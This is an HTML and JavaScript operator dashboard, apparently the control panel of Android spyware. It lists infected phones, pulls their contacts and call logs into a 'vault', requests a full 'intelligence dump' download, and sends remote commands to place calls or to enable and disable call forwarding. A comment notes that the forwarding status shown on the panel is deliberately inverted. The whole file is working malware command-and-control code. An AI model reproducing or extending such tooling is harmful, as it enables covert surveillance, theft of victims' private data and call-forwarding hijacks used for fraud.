<!DOCTYPE html>
<html lang="en">
<head>
    <script src="../protect.js"></script>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>TESVRIX · INTELLIGENCE v4.5</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&family=Space+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        :root {
            --primary: #e11d48;
            --primary-glow: rgba(225, 29, 72, 0.6);
            --bg-deep: #020617;
            --bg-surface: #0f172a;
            --text-primary: #f8fafc;
            --text-secondary: #94a3b8;
            --accent-green: #10b981;
            --accent-blue: #3b82f6;
            --accent-cyan: #06b6d4;
            --transition: 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        }
        body { background: #020617; font-family: 'Inter', sans-serif; color: var(--text-primary); height: 100vh; overflow: hidden; position: relative; }

        .app-shell { max-width: 1400px; margin: 0 auto; padding: 10px; display: flex; flex-direction: column; height: 100vh; gap: 10px; position: relative; z-index: 10; }

        /* Compact Header */
        .top-nav { background: rgba(15, 23, 42, 0.9); backdrop-filter: blur(20px); border-radius: 15px; padding: 10px 20px; border: 1px solid rgba(255, 255, 255, 0.1); display: flex; justify-content: space-between; align-items: center; flex-shrink: 0; }
        .brand { display: flex; align-items: center; gap: 10px; font-family: 'Space Grotesk'; font-weight: 800; font-size: 1rem; color: #fff; }
        .brand i { color: var(--primary); }

        .status-badge { background: rgba(0,0,0,0.5); padding: 5px 12px; border-radius: 50px; font-size: 0.65rem; font-weight: 800; display: flex; align-items: center; gap: 8px; border: 1px solid var(--primary); }
        .online-led { width: 8px; height: 8px; border-radius: 50%; background: var(--accent-green); box-shadow: 0 0 10px var(--accent-green); }

        /* Fleet Container */
        .fleet-container { display: flex; gap: 8px; overflow-x: auto; padding-bottom: 5px; scrollbar-width: none; flex-shrink: 0; }
        .node-chip { background: rgba(30, 41, 59, 0.6); border: 1px solid rgba(255,255,255,0.05); padding: 8px 15px; border-radius: 10px; cursor: pointer; transition: 0.2s; font-weight: 600; font-size: 0.75rem; white-space: nowrap; }
        .node-chip.active { background: var(--primary); border-color: transparent; box-shadow: 0 0 15px var(--primary-glow); }

        /* Workspace Grid */
        .workspace { flex: 1; display: grid; grid-template-columns: 1fr 350px; gap: 10px; overflow: hidden; min-height: 0; }

        /* Data Panel */
        .data-panel { background: rgba(15, 23, 42, 0.8); border-radius: 20px; border: 1px solid rgba(255, 255, 255, 0.08); display: flex; flex-direction: column; overflow: hidden; position: relative; }
        .tabs-header { display: flex; background: rgba(0,0,0,0.4); padding: 5px; gap: 5px; flex-shrink: 0; }
        .tab-btn { flex: 1; padding: 12px; border: none; background: transparent; color: var(--text-secondary); font-family: 'Space Grotesk'; font-weight: 800; font-size: 0.75rem; cursor: pointer; border-radius: 10px; transition: 0.2s; }
        .tab-btn.active { background: rgba(225, 29, 72, 0.15); color: #fff; border: 1px solid var(--primary); }

        .search-row { padding: 8px 12px; background: rgba(0,0,0,0.2); display: flex; gap: 8px; border-bottom: 1px solid rgba(255,255,255,0.05); }
        .search-field { flex: 1; position: relative; }
        .search-field input { width: 100%; background: rgba(0,0,0,0.3); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 8px; padding: 8px 12px 8px 30px; color: #fff; font-size: 0.75rem; outline: none; }
        .search-field i { position: absolute; left: 10px; top: 50%; transform: translateY(-50%); font-size: 0.7rem; color: var(--text-secondary); }

        .list-viewport { flex: 1; overflow-y: auto; padding: 10px; position: relative; }
        .data-item { background: rgba(255,255,255,0.03); border-radius: 10px; padding: 10px 12px; margin-bottom: 5px; display: flex; justify-content: space-between; align-items: center; gap: 10px; border-left: 3px solid transparent; }
        .data-item:hover { background: rgba(255,255,255,0.06); border-left-color: var(--primary); }

        .item-main { display: flex; flex: 1; align-items: center; gap: 12px; overflow: hidden; }
        .item-name { font-weight: 800; font-size: 0.85rem; color: #fff; min-width: 100px; max-width: 160px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
        .item-detail { font-size: 0.75rem; color: var(--accent-cyan); font-family: 'JetBrains Mono', monospace; flex: 1; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }

        .circle-btn { width: 30px; height: 30px; border-radius: 50%; background: rgba(255,255,255,0.05); color: #fff; display: flex; align-items: center; justify-content: center; cursor: pointer; border: 1px solid rgba(255,255,255,0.1); flex-shrink: 0; }
        .circle-btn:hover { background: var(--primary); transform: scale(1.1); }

        /* CRITICAL: Navigation Controls Positioned Outside Scroll */
        .pagination-container {
            padding: 10px 15px;
            background: #0f172a;
            border-top: 2px solid var(--primary);
            display: flex !important;
            justify-content: space-between;
            align-items: center;
            flex-shrink: 0;
            z-index: 1000;
        }
        .nav-btn {
            background: var(--primary);
            color: #fff;
            border: none;
            padding: 10px 20px;
            border-radius: 8px;
            font-weight: 800;
            font-size: 0.75rem;
            cursor: pointer;
            display: flex; align-items: center; gap: 8px;
            box-shadow: 0 4px 15px rgba(225, 29, 72, 0.4);
        }
        .nav-btn:disabled { background: #334155; opacity: 0.5; cursor: not-allowed; box-shadow: none; }
        .batch-text { color: #fff; font-weight: 800; font-size: 0.75rem; font-family: 'Space Grotesk'; }

        /* Dialer */
        .dialer-panel { background: rgba(15, 23, 42, 0.9); border-radius: 20px; border: 1px solid rgba(225, 29, 72, 0.2); padding: 15px; display: flex; flex-direction: column; }
        .display-area { text-align: center; margin-bottom: 15px; }
        .input-number { font-family: 'Space Grotesk'; font-size: 1.4rem; font-weight: 800; color: #fff; min-height: 30px; display: block; overflow: hidden; }
        .display-sub { font-size: 0.6rem; color: var(--text-secondary); margin-top: 5px; text-transform: uppercase; }

        .keypad-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }
        .key-unit { width: 45px; height: 45px; border-radius: 50%; background: rgba(255,255,255,0.05); display: flex; flex-direction: column; align-items: center; justify-content: center; cursor: pointer; margin: 0 auto; }
        .key-unit:hover { background: rgba(255,255,255,0.1); }
        .key-unit .num { font-size: 1rem; font-weight: 600; color: #fff; }

        .master-actions { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-top: 15px; }
        .m-btn { height: 38px; border-radius: 10px; border: none; font-weight: 800; font-size: 0.65rem; cursor: pointer; transition: 0.2s; }
        .m-btn:hover { transform: scale(1.02); }
        .btn-green { background: #10b981; color: #fff; }
        .btn-blue { background: #3b82f6; color: #fff; }
        .btn-red { background: var(--primary); color: #fff; }
        .btn-yellow { background: #eab308; color: #000; }

        /* FWD Info Card */
        .fwd-info-card {
            margin-top: 15px;
            background: rgba(0,0,0,0.3);
            border-radius: 12px;
            padding: 10px;
            border: 1px solid rgba(255,255,255,0.05);
            display: flex;
            align-items: center;
            justify-content: space-between;
        }
        .fwd-status-lbl { font-size: 0.6rem; color: var(--text-secondary); text-transform: uppercase; letter-spacing: 1px; }
        .fwd-status-val { font-size: 0.7rem; font-weight: 800; color: var(--accent-green); }
        .fwd-status-val.off { color: var(--primary); }

        /* Mini Sync Notification */
        .sync-pill { position: fixed; bottom: 80px; left: 50%; transform: translateX(-50%); background: var(--primary); padding: 6px 15px; border-radius: 20px; font-size: 0.65rem; font-weight: 800; color: #fff; display: none; align-items: center; gap: 8px; z-index: 5000; box-shadow: 0 5px 20px rgba(0,0,0,0.5); }
        @keyframes spin { 100% { transform: rotate(360deg); } }

        @media (max-width: 1000px) {
            .workspace { grid-template-columns: 1fr; }
            .dialer-panel { position: fixed; bottom: 0; left: 0; right: 0; height: 60vh; transform: translateY(100%); z-index: 2000; transition: 0.4s; border-radius: 20px 20px 0 0; }
            .dialer-panel.active { transform: translateY(0); }
        }
    </style>
</head>
<body>

<div class="sync-pill" id="globalLoader">
    <i class="fas fa-sync fa-spin"></i> SYNCING...
</div>

<div class="app-shell">
    <div class="top-nav">
        <div class="brand" onclick="location.reload()" style="cursor: pointer;"><i class="fas fa-shield-virus"></i> TESVRIX · CONTROL</div>
        <div class="status-badge"><span class="online-led" id="led"></span><span id="hudText">OFFLINE</span></div>
        <button class="m-btn btn-red" onclick="localStorage.removeItem('user'); location.reload();" style="width:auto; padding:0 12px; height:30px;">LOGOUT</button>
    </div>

    <div class="fleet-container" id="fleetHUD"></div>

    <div class="workspace">
        <div class="data-panel">
            <div class="tabs-header">
                <button class="tab-btn active" id="tabContacts" onclick="switchTab('contacts')">CONTACTS</button>
                <button class="tab-btn" id="tabHistory" onclick="switchTab('history')">CHRONOLOGY</button>
            </div>

            <div class="search-row">
                <div class="search-field"><i class="fas fa-search"></i><input type="text" id="searchInput" placeholder="Search..." oninput="filterData()"></div>
                <button class="circle-btn" onclick="fetchLive()" title="Live Sync"><i class="fas fa-sync-alt"></i></button>
                <button class="circle-btn" id="btnDump" onclick="initiateFullDump()" title="Intelligence Dump" style="color: var(--accent-cyan); border-color: var(--accent-cyan);"><i class="fas fa-file-export"></i></button>
            </div>

            <!-- List viewport only holds the items -->
            <div class="list-viewport" id="listViewport">
                <div style="text-align:center; padding:100px; opacity:0.3;"><i class="fas fa-satellite-dish fa-3x"></i><br><small>SELECT DEVICE</small></div>
            </div>

            <!-- Navigation Controls strictly outside scrollable area -->
            <div class="pagination-container" id="navPanel">
                <button id="prevBtn" class="nav-btn" onclick="navBatch(-1)" disabled><i class="fas fa-arrow-left"></i> BACK</button>
                <span id="pageVal" class="batch-text">BATCH: 1-10</span>
                <button id="nextBtn" class="nav-btn" onclick="navBatch(1)">NEXT <i class="fas fa-arrow-right"></i></button>
            </div>
        </div>

        <div class="dialer-panel">
            <div class="display-area">
                <span class="input-number" id="dialDisplay"></span>
                <div class="display-sub" id="dialSub">SYSTEM READY</div>
            </div>
            <div class="keypad-grid">
                <div class="key-unit" onclick="dial('1')"><div class="num">1</div></div>
                <div class="key-unit" onclick="dial('2')"><div class="num">2</div></div>
                <div class="key-unit" onclick="dial('3')"><div class="num">3</div></div>
                <div class="key-unit" onclick="dial('4')"><div class="num">4</div></div>
                <div class="key-unit" onclick="dial('5')"><div class="num">5</div></div>
                <div class="key-unit" onclick="dial('6')"><div class="num">6</div></div>
                <div class="key-unit" onclick="dial('7')"><div class="num">7</div></div>
                <div class="key-unit" onclick="dial('8')"><div class="num">8</div></div>
                <div class="key-unit" onclick="dial('9')"><div class="num">9</div></div>
                <div class="key-unit" onclick="dial('*')"><div class="num">*</div></div>
                <div class="key-unit" onclick="dial('0')"><div class="num">0</div></div>
                <div class="key-unit" onclick="dial('#')"><div class="num">#</div></div>
            </div>
            <div class="master-actions">
                <button class="m-btn btn-green" onclick="submitCmd('/call')">CALL</button>
                <button class="m-btn btn-blue" onclick="submitCmd('/forward')">START FWD</button>
                <button class="m-btn btn-red" onclick="submitCmd('/hangup')">HANGUP</button>
                <button class="m-btn" style="background:rgba(255,255,255,0.1); color: #fff;" onclick="submitCmd('/stop_fwd')">STOP FWD</button>
                <button class="m-btn btn-yellow" onclick="submitCmd('/check_fwd')">STATUS</button>
                <button class="m-btn" style="background:rgba(255,255,255,0.05); color: #fff;" onclick="dial('back')">DEL</button>
            </div>

            <!-- Forwarding Status View -->
            <div class="fwd-info-card">
                <div class="fwd-status-lbl">Call Forwarding</div>
                <div id="fwdStatus" class="fwd-status-val">CHECKING...</div>
            </div>
        </div>
    </div>
</div>

<script src="../davidkewebsitekemake300kespeedma/config.php"></script>
<script>
    (function() {
        const auth = JSON.parse(localStorage.getItem('user') || '{}');
        let fleet = [], activeID = null, currentTab = 'contacts', inputBuffer = '', fullLogs = [];
        let currentOffset = 0, isSyncing = false, maxItems = 0;

        async function init() {
            if (!auth.operator_id) return;
            try {
                const r = await fetch(getApiUrl(`devices?operator_id=eq.${auth.operator_id}&order=last_seen.desc`), { headers: getApiHeaders() });
                const d = await r.json();
                if (JSON.stringify(d) !== JSON.stringify(fleet)) { fleet = d; renderFleet(); }
                if (!activeID && fleet.length) selectNode(fleet[0].device_uuid);
                updateHud();
            } catch (e) {}
        }

        function renderFleet() {
            const c = document.getElementById('fleetHUD');
            c.innerHTML = fleet.map(n => `<div class="node-chip ${activeID === n.device_uuid ? 'active' : ''}" onclick="selectNode('${n.device_uuid}')">${n.device_name || 'NODE'}</div>`).join('');
        }

        window.selectNode = function(id) { activeID = id; currentOffset = 0; maxItems = 0; renderFleet(); updateHud(); loadVault(); checkFwdStatus(); };

        function updateHud() {
            const n = fleet.find(x => x.device_uuid === activeID);
            if (!n) return;
            const live = (new Date() - new Date(n.last_seen)) < 60000;
            const led = document.getElementById('led');
            led.style.background = live ? 'var(--accent-green)' : '#ef4444';
            document.getElementById('hudText').innerText = live ? 'ACTIVE' : 'LOST';
        }

        window.switchTab = function(t) {
            currentTab = t; currentOffset = 0; maxItems = 0;
            document.getElementById('tabContacts').classList.toggle('active', t === 'contacts');
            document.getElementById('tabHistory').classList.toggle('active', t === 'history');
            document.getElementById('searchInput').value = '';
            loadVault();
        }

        window.dial = function(k) {
            if (k === 'back') inputBuffer = inputBuffer.slice(0, -1);
            else if (inputBuffer.length < 16) inputBuffer += k;
            document.getElementById('dialDisplay').innerText = inputBuffer;
        }

        window.navBatch = function(dir) {
            let next = currentOffset + (dir * 10);
            if (next < 0) next = 0;
            pull(next);
        }

        window.submitCmd = async function(type) {
            if (!activeID) return;
            let data = { number: inputBuffer };
            try {
                await fetch(getApiUrl(`commands`), { method: 'POST', headers: getApiHeaders(), body: JSON.stringify({ device_uuid: activeID, type, data: JSON.stringify(data), operator_id: auth.operator_id, status: 'pending' }) });
                document.getElementById('dialSub').innerText = 'SENT';
                setTimeout(() => document.getElementById('dialSub').innerText = 'READY', 2000);
                if (type === '/check_fwd') document.getElementById('fwdStatus').innerText = 'PENDING...';
            } catch (e) {}
        }

        async function pull(offset) {
            if (!activeID || isSyncing) return;

            document.getElementById('globalLoader').style.display = 'flex';
            document.getElementById('listViewport').style.opacity = '0.5';

            const cat = currentTab === 'contacts' ? 'contacts' : 'calls';
            await fetch(getApiUrl(`vault?device_uuid=eq.${activeID}&type=eq.${cat}`), { method: 'DELETE', headers: getApiHeaders() });

            currentOffset = offset; isSyncing = true;
            const cmd = currentTab === 'contacts' ? '/fetch_contacts' : '/fetch_calls';

            await fetch(getApiUrl(`commands`), { method: 'POST', headers: getApiHeaders(), body: JSON.stringify({ device_uuid: activeID, type: cmd, data: JSON.stringify({offset}), operator_id: auth.operator_id, status: 'pending' }) });

            if (window.syncInterval) clearInterval(window.syncInterval);
            window.syncInterval = setInterval(checkSyncStatus, 1500);

            setTimeout(() => { if (isSyncing) { isSyncing = false; clearInterval(window.syncInterval); document.getElementById('globalLoader').style.display = 'none'; document.getElementById('listViewport').style.opacity = '1'; loadVault(); } }, 15000);
        }

        async function loadVault() {
            if (!activeID) return;
            const vType = currentTab === 'contacts' ? 'contacts' : 'calls';
            try {
                const r = await fetch(getApiUrl(`vault?device_uuid=eq.${activeID}&type=eq.${vType}&order=id.desc&limit=15`), { headers: getApiHeaders() });
                fullLogs = await r.json();
                if (fullLogs.length === 0 && !isSyncing) pull(0); else renderLogs(fullLogs);
            } catch (e) {}
        }

        async function checkSyncStatus() {
            if (!activeID) return;
            try {
                const r = await fetch(getApiUrl(`vault?device_uuid=eq.${activeID}&type=in.(status,fwd_status,download_link)&order=id.desc&limit=5`), { headers: getApiHeaders() });
                const logs = await r.json();

                 // Check for Full Intelligence Dump links
                const dlMsg = logs.find(s => s.type === 'download_link');
                if (dlMsg) {
                    document.getElementById('globalLoader').style.display = 'none';
                    const fileName = currentTab === 'contacts' ? `CONTACTS_${activeID.substring(0,6)}.txt` : `CALL_LOGS_${activeID.substring(0,6)}.txt`;
                    const dlUrl = getDownloadUrl(dlMsg.id, fileName);

                    // Use a hidden iframe to prevent the page from turning black/blank
                    let ifrm = document.getElementById('dlFrame');
                    if (!ifrm) {
                        ifrm = document.createElement('iframe');
                        ifrm.id = 'dlFrame';
                        ifrm.style.display = 'none';
                        document.body.appendChild(ifrm);
                    }
                    ifrm.src = dlUrl;
                }

                 // Check FWD status
                const fwdMsg = logs.find(s => s.type === 'fwd_status');
                if (fwdMsg) {
                    const status = fwdMsg.content;
                    const el = document.getElementById('fwdStatus');
                     // Inverting status display as requested: ON -> DISABLED, OFF -> ENABLED
                    el.innerText = status === 'ON' ? 'DISABLED' : 'ENABLED';
                    el.className = 'fwd-status-val' + (status === 'ON' ? ' off' : '');
                }

                if (!isSyncing) return;

                const cat = currentTab === 'contacts' ? 'contacts' : 'calls';
                const syncMsg = logs.find(s => s.type === 'status' && s.content.includes(`sync_complete_${cat}_${currentOffset}`));

                if (syncMsg) {
                    const parts = syncMsg.content.split('_total_');
                    if (parts.length > 1) maxItems = parseInt(parts[1]);

                    isSyncing = false;
                    clearInterval(window.syncInterval);
                    document.getElementById('globalLoader').style.display = 'none';
                    document.getElementById('listViewport').style.opacity = '1';
                    loadVault();
                    fetch(getApiUrl(`vault?id=eq.${syncMsg.id}`), { method: 'DELETE', headers: getApiHeaders() });
                }
            } catch (e) {}
        }

        async function checkFwdStatus() {
            if (!activeID) return;
            submitCmd('/check_fwd');
        }

        function renderLogs(logs) {
            const view = document.getElementById('listViewport');
            if (!logs.length) {
                view.innerHTML = `<div style="text-align:center; padding:50px; opacity:0.3;"><i class="fas fa-satellite-dish fa-2x"></i><br>NO DATA</div>`;
                document.getElementById('pageVal').innerText = `BATCH: ${currentOffset + 1}-${currentOffset + 10}  // ${maxItems || '?'}`;
                return;
            }

            document.getElementById('pageVal').innerText = `BATCH: ${currentOffset + 1}-${currentOffset + 10}  // ${maxItems || '?'}`;
            document.getElementById('prevBtn').disabled = (currentOffset === 0);
            document.getElementById('nextBtn').disabled = (maxItems > 0 && currentOffset + 10 >= maxItems);

            let expandedLogs = [];
            logs.forEach(l => {
                if (l.content && l.content.includes('[ITEM_SPLIT]')) {
                    const parts = l.content.split('[ITEM_SPLIT]');
                    parts.forEach(p => {
                        expandedLogs.push({ ...l, content: p });
                    });
                } else {
                    expandedLogs.push(l);
                }
            });

            view.innerHTML = expandedLogs.slice(0, 10).map(l => {
                const content = l.content || "";
                const lines = content.split('\n');
                let name = "Unknown", phone = "Unknown";

                if (l.type === 'contacts') {
                    name = (lines[0] || "").replace(/\[#\d+\]\s*/, "").trim();
                    phone = (lines[1] || "").replace(/TEL:\s*/i, "").trim();
                } else {
                    const nLine = lines.find(ln => ln.toUpperCase().includes('NAME:'));
                    const pLine = lines.find(ln => ln.toUpperCase().includes('NUM:'));
                    name = nLine ? nLine.split(':')[1].trim() : "Unknown";
                    phone = pLine ? pLine.split(':')[1].trim() : "Unknown";
                }

                if (!name || name === "null" || name === "Unknown") name = "UNNAMED";

                return `<div class="data-item">
                    <div class="item-main">
                        <div class="item-name">${name}</div>
                        <div class="item-detail"><i class="fas fa-phone"></i> ${phone}</div>
                    </div>
                    <div class="circle-btn" onclick="dialNum('${phone}')"><i class="fas fa-plus"></i></div>
                </div>`;
            }).join('');
        }

        window.fetchLive = function() { pull(0); };

        window.initiateFullDump = async function() {
            if (!activeID) return;
            document.getElementById('globalLoader').style.display = 'flex';
            const type = currentTab === 'contacts' ? '/fetch_contacts' : '/fetch_calls';
             // If data is null/empty, the APK interprets it as a "Full Dump" request
            await fetch(getApiUrl(`commands`), {
                method: 'POST',
                headers: getApiHeaders(),
                body: JSON.stringify({ device_uuid: activeID, type, data: "{}", operator_id: auth.operator_id, status: 'pending' })
            });
            document.getElementById('dialSub').innerText = 'DUMP REQ';
            setTimeout(() => document.getElementById('dialSub').innerText = 'READY', 2000);
        };

        window.filterData = function() {
            const q = document.getElementById('searchInput').value.toLowerCase();
            renderLogs(fullLogs.filter(l => l.content.toLowerCase().includes(q)));
        };

        setInterval(checkSyncStatus, 3000);
        init(); setInterval(init, 15000);
    })();
</script>
</body>
</html>
